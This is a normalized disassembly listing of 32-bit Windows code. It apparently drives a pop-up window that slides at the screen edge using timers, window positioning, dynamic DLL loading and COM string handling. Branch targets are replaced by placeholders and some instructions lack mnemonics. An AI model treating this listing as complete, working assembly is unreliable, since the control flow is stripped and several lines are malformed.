push edi
call sub_417590
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
push edi
push eax
mov ecx esi
call sub_417af0
jmp r-xdata
sub_4180b0
push 0xffffffff
push sub_43177a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x40
mov eax [ rw-data ]
push esi
mov esi ecx
push edi
mov ecx rw-data
call [ eax + 0xc ]
add eax 0x10
mov [ esp + 0xc ] eax
mov [ esp + 0x50 ] 0x1
lea ecx [ esp + 0xc ]
push r--data
push ecx
call sub_412ce0
mov edi [ esp + 0x14 ]
add esp 0x8
push edi
lea ecx [ esp + 0x14 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x50 ] 0x2
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esi + 0x24 ]
call sub_407380
mov [ esp + 0x50 ] 0x3
mov ecx eax
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
lea ecx [ esp + 0xc ]
call sub_418010
mov [ esp + 0x50 ] 0x6
lea ecx [ esp + 0x2c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x50 ] 0x5
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x8 ]
mov eax [ ecx - 0xc ]
test eax eax
jl r-xdata
mov [ esp + 0x50 ] 0x1
mov eax [ esp + 0x8 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
push r--data
push ecx
call [ wcsstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0x50 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
pop edi
pop esi
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
sub eax [ esp + 0x8 ]
sar eax 0x1
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x40 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x4c
retn 0x10
mov ecx [ eax ]
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
mov ecx [ esi + 0x4 ]
push 0x0
push 0xf012
push 0x112
push ecx
call [ PostMessageW@IAT ]
sub_4181f0
cmp [ esp + 0x8 ] 0x201
jne r-xdata
xor eax eax
retn 0x10
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push edx
push eax
push 0x201
call sub_4180b0
mov eax 0x1
retn 0x10
sub_4182d0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x1fffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax * 8 ]
push edi
call sub_42e3bc
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_414320
sub_418320
push esi
push edi
mov edi ecx
mov esi [ edi + 0x8 ]
cmp esi [ edi + 0xc ]
je r-xdata
pop edi
pop esi
retn
lea esp [ esp ]
mov ecx [ esi ]
mov eax [ ecx ]
call [ eax ]
mov eax [ edi + 0xc ]
add esi 0x8
cmp esi eax
jne r-xdata
sub_418350
push esi
push edi
mov edi ecx
mov esi [ edi + 0x8 ]
cmp esi [ edi + 0xc ]
je r-xdata
pop edi
pop esi
retn
lea esp [ esp ]
mov ecx [ esi ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ edi + 0xc ]
add esi 0x8
cmp esi eax
jne r-xdata
sub_418390
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_415d50
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x14
sub_4183d0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_415d50
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x14
sub_418410
push 0xffffffff
push sub_43179b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ esp ] eax
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_418460
push 0xffffffff
push sub_4317bb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov [ esp + 0x4 ] ecx
mov [ ecx ] r--data
mov [ esp + 0x10 ] 0xffffffff
mov eax [ ecx + 0x8 ]
test eax eax
lea esi [ ecx + 0x4 ]
je r-xdata
mov ecx [ esp + 0x8 ]
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x8 ]
push ecx
push esi
push edx
push eax
call sub_415d50
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x14
sub_418500
sub esp 0x30
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x44 ]
push 0xfffffff0
push edi
call [ GetWindowLongW@IAT ]
mov esi [ esp + 0x48 ]
test esi esi
mov ebx [ GetParent@IAT ]
mov ebp eax
jne r-xdata
lea eax [ esp + 0x30 ]
push eax
push edi
call [ GetWindowRect@IAT ]
test ebp 0x40000000
jne r-xdata
test ebp 0x40000000
je r-xdata
push edi
call ebx
mov ebx [ GetClientRect@IAT ]
mov edi eax
lea eax [ esp + 0x20 ]
push eax
push edi
call ebx
lea ecx [ esp + 0x10 ]
push ecx
push esi
call ebx
push 0x2
lea edx [ esp + 0x14 ]
push edx
push edi
push esi
call [ MapWindowPoints@IAT ]
test esi esi
je r-xdata
push 0x4
push edi
call [ GetWindow@IAT ]
push edi
call ebx
jmp r-xdata
lea edx [ ecx + edi ]
cmp edx ebp
jle r-xdata
mov ecx eax
jmp r-xdata
push 0x0
lea ecx [ esp + 0x24 ]
push ecx
push 0x0
push 0x30
call [ SystemParametersInfoW@IAT ]
test eax eax
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongW@IAT ]
test eax 0x10000000
je r-xdata
mov esi eax
mov eax [ esp + 0x24 ]
cmp esi eax
jl r-xdata
sub ebp edi
mov ecx ebp
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor esi esi
test eax 0x20000000
je r-xdata
mov esi eax
mov eax [ esp + 0x2c ]
lea edx [ esi + ebx ]
cmp edx eax
jle r-xdata
lea edx [ esp + 0x10 ]
push edx
push esi
call [ GetWindowRect@IAT ]
jmp r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov eax [ esp + 0x44 ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
push 0x0
push eax
call [ SetWindowPos@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
sub eax ebx
mov ebp [ esp + 0x28 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x3c ]
mov esi [ esp + 0x30 ]
mov edi [ esp + 0x38 ]
add eax ecx
sub ebx edx
cdq
sub eax edx
mov ecx eax
sub edi esi
mov eax edi
cdq
sub eax edx
mov edx [ esp + 0x1c ]
sar eax 0x1
sar ecx 0x1
sub ecx eax
mov eax [ esp + 0x14 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax ebx
cdq
sub eax edx
sar eax 0x1
sar esi 0x1
sub esi eax
mov eax [ esp + 0x20 ]
cmp ecx eax
jge r-xdata
sub_418680
sub esp 0x20
push 0x0
lea eax [ esp + 0x14 ]
push eax
push 0x0
push 0x30
call [ SystemParametersInfoW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ esp + 0x28 ]
lea ecx [ esp + 0x4 ]
push ecx
push esi
call [ GetWindowRect@IAT ]
test eax eax
jne r-xdata
add esp 0x20
retn
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x20 ]
push 0x15
push 0xffffffff
sub edx eax
mov eax [ esp + 0x24 ]
push 0xffffffff
add edx ecx
mov ecx [ esp + 0x10 ]
push edx
sub eax [ esp + 0x1c ]
add eax ecx
push eax
push 0x0
push esi
call [ SetWindowPos@IAT ]
pop esi
add esp 0x20
retn
pop esi
add esp 0x20
retn
sub_418720
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call [ GetModuleHandleW@IAT ]
test eax eax
mov [ esi ] eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn 0x4
mov ecx edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
call [ LoadLibraryW@IAT ]
test eax eax
mov [ esi ] eax
je r-xdata
mov edi [ GetProcAddress@IAT ]
push r--data
push eax
call edi
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov ecx [ esi ]
push r--data
push ecx
mov [ esi + 0x8 ] eax
call edi
mov edx [ esi ]
push r--data
push edx
mov [ esi + 0xc ] eax
call edi
mov [ esi + 0x10 ] eax
mov eax [ esi ]
push r--data
push eax
call edi
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
call eax
pop edi
pop esi
retn 0x4
sub_4187d0
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi ]
cmp eax edi
je r-xdata
call eax
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
push eax
call [ FreeLibrary@IAT ]
mov [ esi ] edi
sub_418800
mov eax [ fs : 0x0 ]
mov cl [ rw-data ]
push 0xffffffff
push sub_4317de
push eax
mov eax 0x1
test al cl
mov [ fs : 0x0 ] esp
jne r-xdata
mov ecx [ esp ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
add esp 0xc
retn
or [ rw-data ] eax
xor eax eax
mov [ esp + 0x8 ] eax
push sub_434030
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_42e6e6
add esp 0x4
mov [ esp + 0x8 ] 0xffffffff
sub_418880
push 0xffffffff
push sub_4317fb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x84
push esi
mov esi ecx
mov ecx [ esp + 0x98 ]
push edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov edi eax
lea eax [ esp + 0xc ]
mov [ esp + 0x8 ] eax
call [ rw-data ]
push eax
push edi
lea ecx [ esp + 0x10 ]
call sub_401e50
mov [ esp + 0x94 ] 0x0
mov ecx [ esp + 0x8 ]
push ecx
call [ esi + 0xc ]
mov esi eax
mov [ esp + 0x94 ] 0xffffffff
mov eax [ esp + 0x8 ]
lea edx [ esp + 0xc ]
cmp eax edx
je r-xdata
mov ecx [ esp + 0x8c ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x90
retn 0x4
push eax
call [ free@IAT ]
add esp 0x4
sub_418920
push 0xffffffff
push sub_431826
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x108
push esi
mov esi ecx
mov ecx [ esp + 0x120 ]
push edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov edi eax
lea eax [ esp + 0x90 ]
mov [ esp + 0x8c ] eax
call [ rw-data ]
push eax
push edi
lea ecx [ esp + 0x94 ]
call sub_401e50
mov [ esp + 0x118 ] 0x0
mov ecx [ esp + 0x120 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
lea ecx [ esp + 0xc ]
mov edi eax
mov [ esp + 0x8 ] ecx
call [ rw-data ]
push eax
push edi
lea ecx [ esp + 0x10 ]
call sub_401e50
mov [ esp + 0x118 ] 0x1
mov edx [ esp + 0x8c ]
mov eax [ esp + 0x8 ]
push edx
push eax
call [ esi + 0x10 ]
mov [ esp + 0x118 ] 0x0
mov eax [ esp + 0x8 ]
mov esi [ free@IAT ]
lea ecx [ esp + 0xc ]
cmp eax ecx
je r-xdata
mov [ esp + 0x118 ] 0xffffffff
mov eax [ esp + 0x8c ]
lea edx [ esp + 0x90 ]
cmp eax edx
je r-xdata
push eax
call esi
add esp 0x4
mov ecx [ esp + 0x110 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x114
retn 0x8
push eax
call esi
add esp 0x4
sub_418a20
push 0xffffffff
push sub_431846
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x108
push esi
mov esi ecx
mov ecx [ esp + 0x124 ]
push edi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
mov edi eax
lea eax [ esp + 0x90 ]
mov [ esp + 0x8c ] eax
call [ rw-data ]
push eax
push edi
lea ecx [ esp + 0x94 ]
call sub_401e50
mov [ esp + 0x118 ] 0x0
mov ecx [ esp + 0x124 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
lea ecx [ esp + 0xc ]
mov edi eax
mov [ esp + 0x8 ] ecx
call [ rw-data ]
push eax
push edi
lea ecx [ esp + 0x10 ]
call sub_401e50
mov [ esp + 0x118 ] 0x1
mov edx [ esp + 0x8c ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x120 ]
push edx
push eax
push ecx
call [ esi + 0x14 ]
mov [ esp + 0x118 ] 0x0
mov eax [ esp + 0x8 ]
mov esi [ free@IAT ]
lea edx [ esp + 0xc ]
cmp eax edx
je r-xdata
mov [ esp + 0x118 ] 0xffffffff
mov eax [ esp + 0x8c ]
lea ecx [ esp + 0x90 ]
cmp eax ecx
je r-xdata
push eax
call esi
add esp 0x4
mov ecx [ esp + 0x110 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x114
retn 0xc
push eax
call esi
add esp 0x4
sub_418b40
mov eax [ ecx + 0x58 ]
test eax eax
jne r-xdata
mov edx [ ecx ]
call [ edx + 0x14 ]
push 0x0
call [ PostQuitMessage@IAT ]
xor eax eax
retn 0x10
mov eax [ ecx ]
call [ eax + 0x10 ]
push 0x0
call [ PostQuitMessage@IAT ]
xor eax eax
retn 0x10
sub_418b70
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
push eax
call [ GetParent@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ esi + 0x50 ] ecx
call [ GetDesktopWindow@IAT ]
cmp edi eax
je r-xdata
mov [ esi + 0x50 ] edi
jmp r-xdata
mov edx [ esi + 0x4 ]
push 0x0
push 0x1f4
push 0x430
push edx
call [ SetTimer@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
sub_418bc0
mov eax [ esp + 0x8 ]
sub esp 0x20
cmp eax 0x3
push esi
push edi
mov esi ecx
ja r-xdata
cmp eax 0x430
jne r-xdata
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x20
retn 0x10
push ebx
mov ebx [ FindWindowW@IAT ]
push ebp
push r--data
push 0x0
call ebx
push r--data
push 0x0
mov edi eax
call ebx
test edi edi
mov ebp [ IsWindowVisible@IAT ]
mov ebx eax
je r-xdata
mov ecx [ esi + 0x4 ]
push 0x3
push ecx
call [ KillTimer@IAT ]
mov edx [ esi + 0x38 ]
mov eax [ esi + 0x4 ]
push 0x0
push edx
push 0x2
push eax
call [ SetTimer@IAT ]
pop edi
mov [ esi + 0x4c ] 0x2
xor eax eax
pop esi
add esp 0x20
retn 0x10
dec eax
je r-xdata
test ebx ebx
je r-xdata
push edi
call ebp
test eax eax
jne r-xdata
mov ecx [ esi + 0x50 ]
lea eax [ esp + 0x8 ]
push eax
push ecx
call [ GetWindowRect@IAT ]
mov edi [ esi + 0x28 ]
mov edx [ esi + 0x30 ]
mov ecx [ esi + 0x40 ]
mov eax [ esp + 0xc ]
sub edx edi
mov edi ecx
sub edi eax
mov eax [ esp + 0x14 ]
add edi eax
cmp edi edx
jge r-xdata
dec eax
jne r-xdata
pop ebp
pop ebx
push ebx
call ebp
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
push 0x430
push ecx
call [ KillTimer@IAT ]
mov edx [ esi + 0x4 ]
push 0x0
push 0x0
push 0x10
push edx
call [ SendMessageW@IAT ]
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x28 ]
push 0x1
push ecx
mov [ esp + 0x14 ] eax
call [ KillTimer@IAT ]
mov eax [ esi + 0x48 ]
test eax eax
jne r-xdata
sub [ esp + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov [ esi + 0x4c ] 0xffffffff
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
push 0x1
sub eax ecx
push eax
mov eax [ esp + 0x10 ]
sub edx eax
push edx
push ecx
push eax
mov eax [ esi + 0x50 ]
push eax
call [ MoveWindow@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x20
retn 0x10
push 0x0
lea eax [ esp + 0x1c ]
push eax
push 0x0
push 0x30
call [ SystemParametersInfoW@IAT ]
mov edx [ esi + 0x50 ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
call [ GetWindowRect@IAT ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0xc ]
mov ecx [ esi + 0x44 ]
sub edx eax
cmp edx ecx
jle r-xdata
mov eax [ esi + 0x58 ]
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
push 0x0
push eax
push 0x3
push edx
call [ SetTimer@IAT ]
mov [ esi + 0x4c ] 0x3
jmp r-xdata
mov ecx [ esi + 0x4 ]
push 0x2
push ecx
call [ KillTimer@IAT ]
mov edx [ esi + 0x50 ]
push 0x0
push 0x0
push 0x10
push edx
mov [ esi + 0x4c ] 0xffffffff
mov [ esi + 0x54 ] 0x1
call [ SendMessageW@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x20
retn 0x10
mov edx [ esp + 0x10 ]
add eax ecx
mov ecx [ esp + 0x14 ]
push 0x1
sub ecx eax
push ecx
mov ecx [ esp + 0x10 ]
sub edx ecx
push edx
push eax
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x50 ]
push ecx
push eax
call [ MoveWindow@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x20
retn 0x10
mov eax [ esi + 0x4 ]
push 0x2
push eax
call [ KillTimer@IAT ]
mov ecx [ esi + 0x40 ]
mov edx [ esi + 0x4 ]
push 0x0
push ecx
push 0x1
push edx
call [ SetTimer@IAT ]
pop edi
mov [ esi + 0x4c ] 0x1
xor eax eax
pop esi
add esp 0x20
retn 0x10
mov eax [ esp + 0x14 ]
sub_418e00
sub esp 0x10
push esi
mov esi ecx
mov eax [ esi + 0x48 ]
test eax eax
jne r-xdata
xor eax eax
pop esi
add esp 0x10
retn 0x10
mov ecx [ esi + 0x4 ]
xor eax eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x4 ]
mov [ esp + 0x10 ] eax
push edx
mov [ esp + 0x8 ] 0x10
mov [ esp + 0xc ] 0x2
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] 0xffffffff
call [ TrackMouseEvent@IAT ]
cmp [ esi + 0x4c ] 0x3
mov [ esi + 0x48 ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
push 0x3
push eax
call [ KillTimer@IAT ]
mov [ esi + 0x4c ] 0xffffffff
sub_418e80
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0xffffffff
jne r-xdata
mov [ esi + 0x48 ] 0x0
xor eax eax
pop esi
retn 0x10
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push 0x0
push eax
mov eax [ esi + 0x4 ]
push 0x3
push eax
call [ SetTimer@IAT ]
sub_418eb0
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0xffffffff
jne r-xdata
mov [ esi + 0x48 ] 0x0
xor eax eax
pop esi
retn 0x10
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push 0x0
push eax
mov eax [ esi + 0x4 ]
push 0x3
push eax
call [ SetTimer@IAT ]
sub_418ee0
push esi
mov esi ecx
mov eax [ esi + 0x48 ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn 0x10
cmp [ esi + 0x4c ] 0x3
mov [ esi + 0x48 ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
push 0x3
push eax
call [ KillTimer@IAT ]
mov [ esi + 0x4c ] 0xffffffff
sub_418f10
push esi
mov esi ecx
mov eax [ esi + 0x38 ]
mov ecx [ esi + 0x4 ]
push 0x0
push eax
push 0x2
push ecx
call [ SetTimer@IAT ]
mov [ esi + 0x4c ] 0x2
mov [ esi + 0x58 ] 0x1
xor eax eax
pop esi
retn 0x10
sub_418f80
mov eax [ esp + 0xc ]
sub esp 0x30
push ebx
push ebp
push esi
push edi
mov edi [ GetWindowRect@IAT ]
mov esi ecx
lea ecx [ esp + 0x20 ]
push ecx
push eax
mov [ esi + 0x50 ] eax
call edi
push 0x0
lea edx [ esp + 0x14 ]
push edx
push 0x0
push 0x30
call [ SystemParametersInfoW@IAT ]
mov ecx [ esp + 0x28 ]
mov eax [ esi + 0x40 ]
mov edx [ esp + 0x20 ]
push 0x1
push eax
mov ebx ecx
sub ebx edx
push ebx
mov ebx [ esp + 0x28 ]
sub ebx eax
sub ebx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
sub eax ecx
sub eax [ esp + 0x1c ]
mov ecx [ esi + 0x50 ]
push ebx
add eax edx
push eax
push ecx
call [ MoveWindow@IAT ]
mov eax [ esi + 0x50 ]
lea edx [ esp + 0x30 ]
push edx
push eax
call edi
mov edx [ esp + 0x18 ]
mov ebx [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
mov ebp [ esp + 0x2c ]
mov edi [ esp + 0x1c ]
mov eax edx
sub eax ebx
mov ebx [ esp + 0x10 ]
sub eax ebx
add eax ecx
mov ecx [ esp + 0x24 ]
sub ecx ebp
mov ebp [ esp + 0x14 ]
add esi 0x24
sub ecx ebp
mov [ esi ] eax
add ecx edi
sub edx ebx
mov [ esi + 0x4 ] ecx
sub edi ebp
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x30
retn 0x10
sub_419070
push 0xffffffff
push sub_431858
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_409870
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4190b0
push 0xffffffff
push sub_431880
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
call sub_408fe0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4190f0
push 0xffffffff
push sub_4318a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0xffffffff
call sub_408fe0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_419130
push 0xffffffff
push sub_4318d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_409870
mov [ esp + 0x10 ] 0x1
mov eax 0x32
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] eax
mov eax 0xf
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
xor eax eax
or ecx 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x48 ] eax
mov [ esi + 0x3c ] 0x7d0
mov [ esi + 0x4c ] ecx
mov [ esi + 0x54 ] eax
mov [ esi + 0x58 ] eax
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4191d0
push ebp
mov ebp ecx
mov eax [ ebp ]
test eax eax
jne r-xdata
push edi
mov edi [ esp + 0xc ]
cmp [ edi ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ eax ]
neg eax
sbb eax eax
pop ebp
retn 0x4
push ebx
push esi
mov esi [ SysStringLen@IAT ]
push eax
call esi
mov ecx [ edi ]
push ecx
mov ebx eax
call esi
cmp ebx eax
mov ecx ebx
jbe r-xdata
pop edi
mov eax 0x1
pop ebp
retn 0x4
test ecx ecx
mov esi [ ebp ]
mov edx [ edi ]
jbe r-xdata
mov ecx eax
cmp ebx eax
jae r-xdata
nop
xor ecx ecx
cmp ebx eax
setne cl
pop esi
pop ebx
pop edi
pop ebp
mov eax ecx
retn 0x4
pop esi
pop ebx
pop edi
or eax 0xffffffff
pop ebp
retn 0x4
movzx eax [ esi - 0x2 ]
movzx edx [ edx - 0x2 ]
pop esi
pop ebx
pop edi
sub eax edx
pop ebp
retn 0x4
test ecx ecx
ja r-xdata
mov di [ esi ]
mov bp [ edx ]
dec ecx
add edx 0x2
add esi 0x2
cmp di bp
jne r-xdata
sub_419270
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
mov [ esi ] 0x8
call [ SysAllocString@IAT ]
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
test edi edi
je r-xdata
push 0x8007000e
call sub_42cee0
sub_4192c0
mov eax [ esp + 0x8 ]
test eax eax
mov edx [ esp + 0x4 ]
jne r-xdata
cmp ecx eax
jne r-xdata
mov eax ecx
jmp r-xdata
push edx
push 0x0
push eax
push ecx
call [ VariantChangeType@IAT ]
test eax eax
jge r-xdata
cmp dx [ ecx ]
je r-xdata
retn 0x8
push eax
call sub_42cee0
sub_419300
push esi
mov esi ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
pop esi
retn
mov eax [ esi + 0x3c ]
push 0x0
push 0x0
push 0x12
push eax
call [ PostThreadMessageW@IAT ]
call sub_428850
test eax eax
jne r-xdata
mov edx [ esi + 0x34 ]
push edi
mov edi [ CloseHandle@IAT ]
push edx
call edi
mov eax [ esi + 0x38 ]
push eax
call edi
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x34 ] 0x0
pop edi
mov ecx [ esi + 0x34 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
sub_419360
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
lea ecx [ esi + 0x40 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov ecx [ esi + 0x3c ]
push 0x0
push 0x0
push 0x403
push ecx
call [ PostThreadMessageW@IAT ]
mov edx [ esi + 0x38 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
lea eax [ esi + 0x5c ]
pop esi
retn 0x4
sub_4193a0
